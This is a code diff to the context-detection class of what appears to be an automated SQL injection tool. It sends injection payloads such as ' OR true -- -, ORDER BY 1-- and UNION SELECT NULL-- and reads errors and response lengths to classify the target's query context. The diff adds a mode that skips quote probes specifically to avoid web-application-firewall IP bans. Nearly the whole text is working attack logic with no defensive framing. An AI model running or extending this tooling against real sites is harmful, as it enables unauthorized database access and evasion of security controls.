@@ -2,13 +2,11 @@ import random
 import re
 
 class ContextDiscoverer:
-    def __init__(self, client):
+    def __init__(self, client, disable_strings=True):
         self.client = client
+        self.disable_strings = disable_strings
         self.probes = [
-            {"name": "single_quote", "payload": "'", "weight": 1.0},
-            {"name": "double_quote", "payload": "\"", "weight": 1.0},
-            {"name": "bracket_single", "payload": "')", "weight": 1.0},
-            {"name": "bracket_double", "payload": "\")", "weight": 1.0},
+            {"name": "bracket_single", "payload": " )", "weight": 1.0},
             {"name": "order_by", "payload": " ORDER BY 1--", "weight": 1.0},
             {"name": "union_probe", "payload": " UNION SELECT NULL--", "weight": 1.0},
         ]
@@ -24,46 +22,40 @@ class ContextDiscoverer:
         # 2. Logic-Based Pulse Checking (Intelligent Context Discovery)
         print("  [?] Probing: Direct Logic Pulse (NUMERIC vs STRING)...", flush=True)
         
-        # Pulse 1: Numeric OR True check
-        # If the parameter expects numeric, this evaluates and typically throws off the row count/response size 
-        # OR executes without crashing syntax.
         pulse_num = self.client.send_request(" OR true -- -")
+        len_num = len(pulse_num['text'])
         
-        # Pulse 2: String OR True check
-        # If the parameter expects strings, the first quote breaks the context safely, rest evals true.
+        if self.disable_strings:
+            # Skip all quote-based probes to avoid WAF IP bans or application crashes.
+            pulse_backslash_break = self.client.send_request("\\")
+            if self._check_sql_errors(pulse_backslash_break['text']):
+                 print("  [WARNING] Detected strict quote sanitation via Backslash. Switching to QUOTELESS context.", flush=True)
+                 self.detected_context = "QUOTELESS_STRING" 
+            elif len_num != baseline_len and not self._check_sql_errors(pulse_num['text']):
+                 self.detected_context = "NUMERIC"
+            else:
+                 self.detected_context = "QUOTELESS_STRING" # Fallback to safest route
+            
+            print(f"[+] Discovery Complete. Detected Context: {self.detected_context}", flush=True)
+            return
+            
+        # Rest of standard discovery...
         pulse_sq = self.client.send_request("' OR true -- -")
-        
-        # Pulse 3: Baseline breakage (What errors out?)
         pulse_sq_break = self.client.send_request("'")
-        
-        # Pulse 4: Quoteless Escape breakage Check (Backslash)
-        # If the backend is sanitizing ' by turning it to /, then throwing \ might escape 
-        # the developers closing quote and cause a syntax error (e.g. user = '\' ).
         pulse_backslash_break = self.client.send_request("\\")
         
-        len_num = len(pulse_num['text'])
         len_sq = len(pulse_sq['text'])
         
-        # Analysis phase
-        # Rule 1: If throwing a raw quote breaks it, but the string pulse successfully bypasses errors/changes length meaningfully
         if self._check_sql_errors(pulse_sq_break['text']):
             self.detected_context = "SINGLE_QUOTE"
-            
-        # Rule 2: If the numeric pulse cleanly altered the payload execution (e.g. bypass OR change) without syntax errors
         elif len_num != baseline_len and not self._check_sql_errors(pulse_num['text']):
             self.detected_context = "NUMERIC"
-            
-        # Rule 3: If backslash causes an error but single quote does NOT (because quote is sanitized to / safely)
         elif self._check_sql_errors(pulse_backslash_break['text']) and not self._check_sql_errors(pulse_sq_break['text']):
             print("  [WARNING] Detected strict quote sanitation (likely replaced with /). Switching to QUOTELESS context.", flush=True)
             self.detected_context = "QUOTELESS_STRING" 
-            
-        # Rule 4: If single quote pulse altered execution safely, context is string.
         elif len_sq != baseline_len and not self._check_sql_errors(pulse_sq['text']):
             self.detected_context = "SINGLE_QUOTE"
-            
         else:
-            # Fallback string
             self.detected_context = "SINGLE_QUOTE"
 
         print(f"[+] Discovery Complete. Detected Context: {self.detected_context}", flush=True)
